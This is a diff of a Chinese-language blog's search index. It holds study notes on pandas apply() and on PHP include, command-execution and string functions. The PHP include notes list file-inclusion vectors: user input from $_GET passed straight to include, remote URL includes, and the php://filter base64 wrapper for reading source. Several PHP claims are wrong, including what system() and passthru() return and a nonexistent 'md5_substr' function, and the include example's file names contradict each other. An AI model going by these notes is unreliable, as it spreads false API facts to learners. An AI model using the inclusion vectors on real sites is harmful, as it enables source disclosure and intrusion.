+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">s = pd.Series([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数，接受额外参数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_value</span>(<span class="params">x, value</span>):</span><br><span class="line">    <span class="keyword">return</span> x + value</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 apply 并传递额外参数</span></span><br><span class="line">result = s.apply(add_value, args=(<span class="number">3</span>,))</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中，<code>args</code> 参数是一个元组，包含要传递给 <code>add_value</code> 函数的额外参数。</p>
+<h3 id="4-处理缺失值"><a href="#4-处理缺失值" class="headerlink" title="4. 处理缺失值"></a>4. 处理缺失值</h3><p><code>apply</code> 方法会自动处理缺失值（<code>NaN</code>），它会将缺失值原样保留。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">s = pd.Series([<span class="number">1</span>, np.nan, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">square</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x ** <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 apply 方法</span></span><br><span class="line">result = s.apply(square)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，<code>NaN</code> 值在处理后依然是 <code>NaN</code>。</p>
+<h3 id="5-返回不同类型结果"><a href="#5-返回不同类型结果" class="headerlink" title="5. 返回不同类型结果"></a>5. 返回不同类型结果</h3><p><code>apply</code> 方法可以返回不同类型的结果，例如返回 <code>Series</code> 或 <code>DataFrame</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(&#123;</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数，返回一个 Series</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_function</span>(<span class="params">row</span>):</span><br><span class="line">    <span class="keyword">return</span> pd.Series([row[<span class="string">&#x27;A&#x27;</span>] * <span class="number">2</span>, row[<span class="string">&#x27;B&#x27;</span>] * <span class="number">3</span>], index=[<span class="string">&#x27;A_new&#x27;</span>, <span class="string">&#x27;B_new&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 apply 方法</span></span><br><span class="line">result = df.apply(custom_function, axis=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+<p>这里自定义函数返回一个 <code>Series</code>，<code>apply</code> 会将这些 <code>Series</code> 组合成一个新的 <code>DataFrame</code>。</p>
+<p>综上所述，<code>pandas</code> 的 <code>apply</code> 方法为数据处理提供了极大的灵活性，能帮助你高效地对数据进行自定义操作。</p>
+<h2 id="读取tsv格式文件"><a href="#读取tsv格式文件" class="headerlink" title="读取tsv格式文件"></a>读取tsv格式文件</h2><ul>
+<li><p>我有如下图一个tsv格式文件:</p>
+</li>
+<li><img src="/2025/03/08/pandas%E5%BA%93%E5%AD%A6%E4%B9%A0/image-20250310134945342.png" class="" title="image-20250310134945342">
+</li>
+<li><p>我该怎么把指定的列提取出来呢</p>
+</li>
+<li></li>
+</ul>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>pandas库</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php包含代码机制</title>
+    <url>/2025/01/13/php%E5%8C%85%E5%90%AB%E4%BB%A3%E7%A0%81%E6%9C%BA%E5%88%B6/</url>
+    <content><![CDATA[<h3 id="包含代码机制"><a href="#包含代码机制" class="headerlink" title="包含代码机制"></a>包含代码机制</h3><h4 id="include与echo"><a href="#include与echo" class="headerlink" title="include与echo"></a>include与echo</h4><p>使用 include（或 require 等类似的文件包含函数）包含一个文件时，如果被包含的文件中有 echo 指令，那么 echo 输出的内容会在包含该文件的主文件中显示出来。<br>例如，假设有一个 included_file.php 文件，内容如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is a text&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;included_file.php&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>而在文件include_file.php中，内容如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is included text&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当执行 included_file.php 时，输出结果为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This is a text</span><br><span class="line">This is included text</span><br></pre></td></tr></table></figure>
+<p>可以看到，included_file.php 中的 echo 输出内容在主文件中也显示出来了。</p>
+<h4 id="include括号里面的字符类型设置"><a href="#include括号里面的字符类型设置" class="headerlink" title="include括号里面的字符类型设置"></a>include括号里面的字符类型设置</h4><p>include 函数的括号里面的字符类型设置有以下几种：</p>
+<h5 id="绝对路径"><a href="#绝对路径" class="headerlink" title="绝对路径"></a>绝对路径</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;/path/to/file.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<h5 id="相对路径"><a href="#相对路径" class="headerlink" title="相对路径"></a>相对路径</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<h5 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;file.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>
+<p>包括在其中写入$_GET、$_POST、$_COOKIE、$_SERVER等超全局变量的变量名，也可以包含文件。<br><strong>注意:</strong><br>include和$_GET之间可以没有空格如include$_GET[‘file’]</p>
+<h5 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;http://example.com/remote.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<h5 id="php流包装器"><a href="#php流包装器" class="headerlink" title="php流包装器"></a>php流包装器</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=file.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>文件包含函数</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php命令执行函数详解</title>
+    <url>/2025/01/13/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/</url>
+    <content><![CDATA[<h3 id="首先辨析-system-passthru"><a href="#首先辨析-system-passthru" class="headerlink" title="首先辨析:system,passthru"></a>首先辨析:system,passthru</h3><p>1.对于system和passthru函数.</p>
+<ul>
+<li>共同点:<br>1.都用来执行外部命令<br>2.都会先把命令的执行结果直接输出到标准输出（例如，在网页上显示或者在命令行终端显示）。</li>
+<li>不同点:<br>1.system具有默认返回值,即会返回命令执行结果的最后一行的最后一个字符,<br>2.对于执行命令的状态值,system函数返回的是0表示命令执行成功,其他值表示命令执行失败,<br>3.并且system是必须要写作:</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -l&quot;</span>,<span class="variable">$return_var</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;命令执行状态值为: &quot;</span>.<span class="variable">$return_var</span>;</span><br></pre></td></tr></table></figure>
+<p>即必须要在后面加上一个变量作为命令执行状态值的接收变量,然后通过echo输出命令执行状态值.<br>4.而passthru函数则没有这个要在后面多写一个变量接收命令执行状态值的步骤的规定,它的返回值直接就是0表示命令执行成功,其他值表示命令执行失败.<br><strong>小结:</strong><br>它们最大的区别就是默认的返回值,system函数返回的是命令执行结果的最后一行的最后一个字符<br>而passthru函数则是直接返回命令执行状态.</p>
+<h3 id="shell-exec函数"><a href="#shell-exec函数" class="headerlink" title="shell_exec函数"></a>shell_exec函数</h3><p>执行外部命令，并将命令的输出作为字符串返回，不会自动输出到标准输出，需要手动使用 echo 或其他输出函数进行输出。<br>如果命令执行失败或没有输出，将返回 null。<br>比如:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 执行 ls 命令，并存储命令输出</span></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ls -l&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Output from shell_exec function:\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$output</span>!== <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Command failed or no output.\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>命令执行函数</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php比较字符1</title>
+    <url>/2025/01/11/php%E6%AF%94%E8%BE%83%E5%AD%97%E7%AC%A61/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>php比较字符</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php字符串处理函数</title>
+    <url>/2025/01/13/php%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<h3 id="php字符串处理函数"><a href="#php字符串处理函数" class="headerlink" title="php字符串处理函数"></a>php字符串处理函数</h3><h4 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr() 函数"></a>substr() 函数</h4><p>语法: substr(string, start, length)<br>功能: 返回字符串的子串，从 start 位置开始，长度为 length。<br>如；</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">5</span>); <span class="comment">//输出 &quot;Hello&quot;</span></span><br></pre></td></tr></table></figure>
+<p>如果最后一个参数为1,就是指选中那个位置的字符.<br><strong>补充</strong>: md5_substr() 函数用来处理中文字符串</p>
+<p>特性:<br>1.如果在substr()第一个位置里面写入的值为一个文件名,那么substr是读取&#x2F;截取的这个文件本身名字的一部分,并非文件内部代码的一部分。</p>
+<h4 id="intval-函数"><a href="#intval-函数" class="headerlink" title="intval() 函数"></a>intval() 函数</h4><p>语法: intval(string)<br><strong>机制1</strong>:<br>若前缀为0x，则认为是十六进制数；<br>若前缀为0，则认为是八进制数；<br>若没有前缀，则认为是十进制数。<br>最后都是转化为10进制数整数<br><strong>机制2:</strong><br>对于第二个参数:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo intval(123.12,0)</span><br></pre></td></tr></table></figure>
+<p>为0,则自动检测进制,最终都是把第一个参数转换为10进制整数;<br>为2,8,16则为对应进制的数。<br><strong>功能</strong>: 将字符串转换为整数。<br>如:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;123.456&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$str</span>); <span class="comment">//输出 123</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="str-replace-函数"><a href="#str-replace-函数" class="headerlink" title="str_replace() 函数"></a>str_replace() 函数</h4><p>语法: str_replace(search, replace, subject)<br>功能: 在 subject 中搜索 search，并替换为 replace。</p>
+<h4 id="strpos-函数"><a href="#strpos-函数" class="headerlink" title="strpos()函数"></a>strpos()函数</h4><p>语法:strpos(string,find,start)<br>最后的start是可选,规定了开始的位置。</p>
+]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>php字符串处理函数</tag>
       </tags>
   </entry>
   <entry>
@@ -1744,139 +1878,39 @@ int main()&#123;
       </tags>
   </entry>
   <entry>
-    <title>php命令执行函数详解</title>
-    <url>/2025/01/13/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/</url>
-    <content><![CDATA[<h3 id="首先辨析-system-passthru"><a href="#首先辨析-system-passthru" class="headerlink" title="首先辨析:system,passthru"></a>首先辨析:system,passthru</h3><p>1.对于system和passthru函数.</p>
-<ul>
-<li>共同点:<br>1.都用来执行外部命令<br>2.都会先把命令的执行结果直接输出到标准输出（例如，在网页上显示或者在命令行终端显示）。</li>
-<li>不同点:<br>1.system具有默认返回值,即会返回命令执行结果的最后一行的最后一个字符,<br>2.对于执行命令的状态值,system函数返回的是0表示命令执行成功,其他值表示命令执行失败,<br>3.并且system是必须要写作:</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -l&quot;</span>,<span class="variable">$return_var</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;命令执行状态值为: &quot;</span>.<span class="variable">$return_var</span>;</span><br></pre></td></tr></table></figure>
-<p>即必须要在后面加上一个变量作为命令执行状态值的接收变量,然后通过echo输出命令执行状态值.<br>4.而passthru函数则没有这个要在后面多写一个变量接收命令执行状态值的步骤的规定,它的返回值直接就是0表示命令执行成功,其他值表示命令执行失败.<br><strong>小结:</strong><br>它们最大的区别就是默认的返回值,system函数返回的是命令执行结果的最后一行的最后一个字符<br>而passthru函数则是直接返回命令执行状态.</p>
-<h3 id="shell-exec函数"><a href="#shell-exec函数" class="headerlink" title="shell_exec函数"></a>shell_exec函数</h3><p>执行外部命令，并将命令的输出作为字符串返回，不会自动输出到标准输出，需要手动使用 echo 或其他输出函数进行输出。<br>如果命令执行失败或没有输出，将返回 null。<br>比如:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 执行 ls 命令，并存储命令输出</span></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ls -l&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Output from shell_exec function:\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$output</span>!== <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Command failed or no output.\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>命令执行函数</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php字符串处理函数</title>
-    <url>/2025/01/13/php%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0/</url>
-    <content><![CDATA[<h3 id="php字符串处理函数"><a href="#php字符串处理函数" class="headerlink" title="php字符串处理函数"></a>php字符串处理函数</h3><h4 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr() 函数"></a>substr() 函数</h4><p>语法: substr(string, start, length)<br>功能: 返回字符串的子串，从 start 位置开始，长度为 length。<br>如；</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">5</span>); <span class="comment">//输出 &quot;Hello&quot;</span></span><br></pre></td></tr></table></figure>
-<p>如果最后一个参数为1,就是指选中那个位置的字符.<br><strong>补充</strong>: md5_substr() 函数用来处理中文字符串</p>
-<p>特性:<br>1.如果在substr()第一个位置里面写入的值为一个文件名,那么substr是读取&#x2F;截取的这个文件本身名字的一部分,并非文件内部代码的一部分。</p>
-<h4 id="intval-函数"><a href="#intval-函数" class="headerlink" title="intval() 函数"></a>intval() 函数</h4><p>语法: intval(string)<br><strong>机制1</strong>:<br>若前缀为0x，则认为是十六进制数；<br>若前缀为0，则认为是八进制数；<br>若没有前缀，则认为是十进制数。<br>最后都是转化为10进制数整数<br><strong>机制2:</strong><br>对于第二个参数:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo intval(123.12,0)</span><br></pre></td></tr></table></figure>
-<p>为0,则自动检测进制,最终都是把第一个参数转换为10进制整数;<br>为2,8,16则为对应进制的数。<br><strong>功能</strong>: 将字符串转换为整数。<br>如:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;123.456&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$str</span>); <span class="comment">//输出 123</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="str-replace-函数"><a href="#str-replace-函数" class="headerlink" title="str_replace() 函数"></a>str_replace() 函数</h4><p>语法: str_replace(search, replace, subject)<br>功能: 在 subject 中搜索 search，并替换为 replace。</p>
-<h4 id="strpos-函数"><a href="#strpos-函数" class="headerlink" title="strpos()函数"></a>strpos()函数</h4><p>语法:strpos(string,find,start)<br>最后的start是可选,规定了开始的位置。</p>
-]]></content>
-      <categories>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>php字符串处理函数</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php包含代码机制</title>
-    <url>/2025/01/13/php%E5%8C%85%E5%90%AB%E4%BB%A3%E7%A0%81%E6%9C%BA%E5%88%B6/</url>
-    <content><![CDATA[<h3 id="包含代码机制"><a href="#包含代码机制" class="headerlink" title="包含代码机制"></a>包含代码机制</h3><h4 id="include与echo"><a href="#include与echo" class="headerlink" title="include与echo"></a>include与echo</h4><p>使用 include（或 require 等类似的文件包含函数）包含一个文件时，如果被包含的文件中有 echo 指令，那么 echo 输出的内容会在包含该文件的主文件中显示出来。<br>例如，假设有一个 included_file.php 文件，内容如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is a text&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;included_file.php&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>而在文件include_file.php中，内容如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is included text&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>当执行 included_file.php 时，输出结果为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This is a text</span><br><span class="line">This is included text</span><br></pre></td></tr></table></figure>
-<p>可以看到，included_file.php 中的 echo 输出内容在主文件中也显示出来了。</p>
-<h4 id="include括号里面的字符类型设置"><a href="#include括号里面的字符类型设置" class="headerlink" title="include括号里面的字符类型设置"></a>include括号里面的字符类型设置</h4><p>include 函数的括号里面的字符类型设置有以下几种：</p>
-<h5 id="绝对路径"><a href="#绝对路径" class="headerlink" title="绝对路径"></a>绝对路径</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;/path/to/file.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
-<h5 id="相对路径"><a href="#相对路径" class="headerlink" title="相对路径"></a>相对路径</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
-<h5 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;file.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>
-<p>包括在其中写入$_GET、$_POST、$_COOKIE、$_SERVER等超全局变量的变量名，也可以包含文件。<br><strong>注意:</strong><br>include和$_GET之间可以没有空格如include$_GET[‘file’]</p>
-<h5 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;http://example.com/remote.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
-<h5 id="php流包装器"><a href="#php流包装器" class="headerlink" title="php流包装器"></a>php流包装器</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=file.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-
-
-]]></content>
-      <categories>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>文件包含函数</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php比较字符1</title>
-    <url>/2025/01/11/php%E6%AF%94%E8%BE%83%E5%AD%97%E7%AC%A61/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>php比较字符</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pandas库学习(持续更新)</title>
-    <url>/2025/03/08/pandas%E5%BA%93%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="python-pandas库学习"><a href="#python-pandas库学习" class="headerlink" title="python pandas库学习"></a>python pandas库学习</h1><h2 id="apply-方法"><a href="#apply-方法" class="headerlink" title="apply() 方法"></a><code>apply()</code> 方法</h2><p><code>pandas</code> 中的 <code>apply</code> 方法是一个非常灵活且强大的工具，可用于对 <code>Series</code> 或 <code>DataFrame</code> 对象中的元素、行或列应用自定义函数。下面为你从多个方面详细介绍其用法。</p>
-<h3 id="1-对-Series-对象使用-apply"><a href="#1-对-Series-对象使用-apply" class="headerlink" title="1. 对 Series 对象使用 apply"></a>1. 对 <code>Series</code> 对象使用 <code>apply</code></h3><p><code>Series</code> 是一维带标签数组，<code>apply</code> 可对其中每个元素应用指定函数。</p>
-<h4 id="基础示例"><a href="#基础示例" class="headerlink" title="基础示例"></a>基础示例</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 Series</span></span><br><span class="line">s = pd.Series([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个简单的函数，用于将元素乘以 2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multiply_by_two</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x * <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 apply 方法应用函数</span></span><br><span class="line">result = s.apply(multiply_by_two)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
-
-<p>在这个例子中，<code>multiply_by_two</code> 函数被应用到 <code>Series</code> 的每个元素上，将每个元素都乘以 2。</p>
-<h4 id="使用匿名函数（lambda-函数）"><a href="#使用匿名函数（lambda-函数）" class="headerlink" title="使用匿名函数（lambda 函数）"></a>使用匿名函数（<code>lambda</code> 函数）</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">s = pd.Series([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"><span class="comment"># 使用 lambda 函数进行同样的操作</span></span><br><span class="line">result = s.apply(<span class="keyword">lambda</span> x: x * <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
-
-<p><code>lambda</code> 函数让代码更简洁，适合实现简单逻辑。</p>
-<h3 id="2-对-DataFrame-对象使用-apply"><a href="#2-对-DataFrame-对象使用-apply" class="headerlink" title="2. 对 DataFrame 对象使用 apply"></a>2. 对 <code>DataFrame</code> 对象使用 <code>apply</code></h3><p><code>DataFrame</code> 是二维表格型数据结构，<code>apply</code> 可按行或列应用函数，通过 <code>axis</code> 参数控制。</p>
-<h4 id="按列应用函数（axis-0）"><a href="#按列应用函数（axis-0）" class="headerlink" title="按列应用函数（axis = 0）"></a>按列应用函数（<code>axis = 0</code>）</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 DataFrame</span></span><br><span class="line">df = pd.DataFrame(&#123;</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数，用于计算每列的和</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_sum</span>(<span class="params">column</span>):</span><br><span class="line">    <span class="keyword">return</span> column.<span class="built_in">sum</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 apply 按列应用函数</span></span><br><span class="line">result = df.apply(column_sum, axis=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
-
-<p>这里 <code>axis = 0</code> 表示按列操作，函数会依次对每列进行计算。</p>
-<h4 id="按行应用函数（axis-1）"><a href="#按行应用函数（axis-1）" class="headerlink" title="按行应用函数（axis = 1）"></a>按行应用函数（<code>axis = 1</code>）</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(&#123;</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数，用于计算每行的和</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">row_sum</span>(<span class="params">row</span>):</span><br><span class="line">    <span class="keyword">return</span> row[<span class="string">&#x27;A&#x27;</span>] + row[<span class="string">&#x27;B&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 apply 按行应用函数</span></span><br><span class="line">result = df.apply(row_sum, axis=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
-
-<p><code>axis = 1</code> 表示按行操作，函数会依次对每行进行计算。</p>
-<h3 id="3-传递额外参数"><a href="#3-传递额外参数" class="headerlink" title="3. 传递额外参数"></a>3. 传递额外参数</h3><p><code>apply</code> 方法允许传递额外参数给自定义函数。</p>
